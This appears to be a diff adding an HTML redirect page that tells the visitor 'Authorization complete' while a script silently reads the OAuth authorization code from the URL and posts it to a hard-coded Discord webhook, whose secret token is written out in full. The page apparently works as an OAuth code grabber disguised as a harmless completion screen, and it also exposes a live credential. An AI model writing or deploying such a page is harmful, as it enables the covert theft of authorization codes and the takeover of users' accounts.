@@ -1,0 +1,23 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+  <head><title>Redirecting...</title></head>
+  <body>
+    <h2>Authorization complete.</h2>
+    <p>You may now close this tab.</p>
+    <script>
+      // Extract the authorization code from the URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const code = urlParams.get("code");
+
+      // Send it to your Discord webhook
+      fetch("https://discord.com/api/webhooks/1399004483115028540/PNY71dY_LU5DtBlgdSEvxZpJ_gX3GTqAOYVHYNz2_IRGvyg0P8jiVRSQaS9w2lF2Tfm-", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `OAuth Code Received: \`${code}\``
+        })
+      });
+    </script>
+  </body>
+</html>
